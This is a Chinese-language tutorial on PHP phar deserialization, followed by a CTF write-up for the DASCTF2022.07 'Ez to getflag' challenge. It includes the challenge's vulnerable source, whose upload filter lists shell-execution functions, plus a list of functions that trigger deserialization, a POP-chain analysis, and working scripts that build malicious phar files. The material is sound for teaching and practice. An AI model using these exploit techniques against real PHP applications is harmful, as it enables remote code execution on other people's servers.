**phar反序列化**

**（一）什么是phar**

php官方手册是这样说的

> **phar 扩展提供了一种将整个 PHP 应用程序放入单个叫做“phar”（PHP 归档）文件的方法，以便于分发和安装。**
>
> **什么是 phar？phar 归档的最佳特征是可以将多个文件组合成一个文件。 因此，phar 归档提供了在单个文件中分发完整的 PHP 应用程序并无需将其解压缩到磁盘而直接运行文件的方法。此外，phar 归档可以像任何其他文件一样由 PHP 在命令行和 Web 服务器上执行。phar 有点像 PHP 应用程序的移动存储器。**
>

phar是一种将多个php文件打包成一个文件的文件形式，可以简单理解位一种压缩包，类似于Java的JAR文件，便于分发和部署，不经过解压就能被PHP访问。

php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器

**（二）phar的结构**

1.Stub(phar文件标识）

格式为=> xxx<?php xxx;__HALT_COMPILER();?>。前面内容不限，后面必须以__HALT_COMPILER();结尾。 在开发中Stub是当你直接运行 PHAR 文件时执行的 PHP 代码。Stub通常用于初始化、加载其他文件或执行主要逻辑。

2.manifest (用序列化方式存储压缩文件的属性等信息)

phar文件本质上是一种压缩文件，其中每个被压缩文件的信息都放在这。manifest还会以序列化的形式存储用户自定义的meta-data，常常利用这一点攻击。

3.contents (压缩文件的内容)

<font style="color:rgb(51, 65, 85);">被压缩的文件内容放在这</font>

<font style="color:rgb(51, 65, 85);">4.signature (签名，在文件末尾)</font>

**（三）生成phar**

```php
<?php

  class test{
  public $name='phpinfo();';
  }

  //创建phar对象
  $phar = new phar("test.phar");
//开始构建phar文件
$phar->startBuffering();
//设置存根Stub
$phar->setStub("<?php__HALT_COMPILER();?>");
//创建test利用对象
$o=new test();
//自定义Metadata 把test的实例对象传入 会以序列化的方式存入manifest
$phar->setMetadata($o);
//添加压缩的文件
$phar->addFromString("flag.txt","flag{123cascs}");
//结束创建，自动签名。
$phar->stopBuffering();

?>
```

	执行这个php文件会在目录下创建test.phar。执行之前需要把php.ini配置文件下的[Phar]phar.readonly改为off。默认是被注释掉的。

```php
[Phar]
phar.readonly = Off
```

如果不改会报以下错误。看到报错就知道改什么了。

> _**Fatal error**__: Uncaught UnexpectedValueException: creating archive “test.phar” disabled by the php.ini setting phar.readonly_
>

**（四）利用phar**

有序列化就有反序列化，读取phar文件的时候肯定是要经历反序列号的。

大部分的文件系统函数通过phar://伪协议文件时都会进行meta-data的反序列化操作，可以利用的函数列表

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1734574116584-6bb3a7fe-a31c-42b9-9c78-afab70230153.png)

刚才生成了phar文件，现在模拟一下利用phar反序列化的操作。

```php
<?php
class test{
    public $name='';
    public function __destruct()
    {
        eval($this->name);
    }
}

echo file_get_contents('phar://test.phar/flag.txt');
?>
```

		在这里test类的析构函数__destruct会eval执行$name变量。

在使用file_get_contents的时候使用了phar://伪协议，进行了反序列化，使得name的值为phpinfo();执行到析构函数的时候会eval(“phpinfo();”);

攻击者自定义$name的内容进行攻击。

**（五）phar反序列化触发函数**

```php
fopen() unlink() stat() fstat() fseek() rename() opendir() rmdir() mkdir() file_put_contents() file_get_contents() 
file_exists() fileinode() include() require() include_once require_once() filemtime() fileowner() fileperms() 
filesize() is_dir() scandir() rmdir() highlight_file()
//外加一个类
new DirectoryIteartor() 
```

****

<h2 id="511a9d7c">**[DASCTF2022.07赋能赛]Ez to getflag**</h2>
打开容器，这个网站只有两个功能，图片查看和图片上传。其中图片上传只能上传png图片，因此不能利用相关功能进行RCE。

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1734584960339-2bb471c4-81d6-4537-ad28-472b5184b0a4.png)

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1734584980630-10926b5a-995f-48cc-90c5-90eef45f926b.png)

不过图片查看界面有个任意文件读取漏洞，从index.php里可以看到有个file.php文件

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1734596553978-c90cf148-4837-4ad4-bf29-29e85f9ce2d6.png)

再从file.php里看到有个class.php,而class.php就是源代码的主要内容

![](https://cdn.nlark.com/yuque/0/2024/png/43146588/1734596667987-e2ce37f9-ea71-42d9-8e43-7288d3dd65ae.png)

以下是这道题中所有的源代码

```php
<?php
    error_reporting(0);
    session_start();
    require_once('class.php');
    $upload = new Upload();
    $upload->uploadfile();
?>
```

```php
<?php
    error_reporting(0);
    session_start();
    require_once('class.php');
    $filename = $_GET['f'];
    $show = new Show($filename);
    $show->show();
?>
```

```php
<?php
    class Upload {
        public $f;
        public $fname;
        public $fsize;
        function __construct(){
            $this->f = $_FILES;
        }
        function savefile() {  
            $fname = md5($this->f["file"]["name"]).".png"; 
            if(file_exists('./upload/'.$fname)) { 
                @unlink('./upload/'.$fname);
            }
            move_uploaded_file($this->f["file"]["tmp_name"],"upload/" . $fname); 
            echo "upload success! :D"; 
        } 
        function __toString(){
            $cont = $this->fname;
            $size = $this->fsize;
            echo $cont->$size;
            return 'this_is_upload';
        }
        function uploadfile() { 
            if($this->file_check()) { 
                $this->savefile(); 
            } 
        }
        function file_check() { 
            $allowed_types = array("png");
            $temp = explode(".",$this->f["file"]["name"]);
            $extension = end($temp); 
            if(empty($extension)) { 
                echo "what are you uploaded? :0";
                return false;
            }
            else{ 
                if(in_array($extension,$allowed_types)) {
                    $filter = '/<\?php|php|exec|passthru|popen|proc_open|shell_exec|system|phpinfo|assert|chroot|getcwd|scandir|delete|rmdir|rename|chgrp|chmod|chown|copy|mkdir|file|file_get_contents|fputs|fwrite|dir/i';
                    $f = file_get_contents($this->f["file"]["tmp_name"]);
                    if(preg_match_all($filter,$f)){
                        echo 'what are you doing!! :C';
                        return false;
                    }
                    return true; 
                } 
                else { 
                    echo 'png onlyyy! XP'; 
                    return false; 
                } 
            }
        }
    }
    class Show{
        public $source;
        public function __construct($fname)
        {
            $this->source = $fname;
        }
        public function show()
        {
            if(preg_match('/http|https|file:|php:|gopher|dict|\.\./i',$this->source)) {
                die('illegal fname :P');
            } else {
                echo file_get_contents($this->source);
                $src = "data:jpg;base64,".base64_encode(file_get_contents($this->source));
                echo "<img src={$src} />";
            }
        
        }
        function __get($name)
        {
            $this->ok($name);
        }
        public function __call($name, $arguments)
        {
            if(end($arguments)=='phpinfo'){
                phpinfo();
            }else{
                $this->backdoor(end($arguments));
            }
            return $name;
        }
        public function backdoor($door){
            include($door);
            echo "hacked!!";
        }
        public function __wakeup()
        {
            if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
                die("illegal fname XD");
            }
        }
    }
    class Test{
        public $str;
        public function __construct(){
            $this->str="It's works";
        }
        public function __destruct()
        {
            echo $this->str;
        }
    }
?>
```

可利用的漏洞点在class.php的backdoor()函数里的include()

构造POP链，可以看到Show:__call()调用了backdoor()，因此作为最后一步，Show:__get()中调用的ok()方法并不存在，可以通过此调用__call()，Show:__toString()中有一步echo $cont->$size;，其中如果$cont不是class Show()的实例化对象就不存在$size属性，可以用来调用__get()，而Test:__destruct()可以通过将$str对象转化为字符串显示时调用__toString()。

因此构造出的POP链为`<font style="color:rgb(51, 51, 51);background-color:rgb(230, 230, 230);">Test:__destruct=>Upload:__tostring=>Show:__get=>show:__call=>backdoor()</font>`

反序列化如下：

```php
<?php
class Test{
public $str;
}
class Upload {
  public $f;
public $fname;
public $fsize;
function __construct(){
  $this->fname=new Show;
  $this->fsize='phpinfo';
}
}
class Show{
  public $source;
  }
$a=new Test;
$a->str=new Upload();
echo serialize($a);
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
$phar->setMetadata($a); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();

?>
```

<font style="color:rgb(51, 51, 51);background-color:rgb(230, 230, 230);"></font>

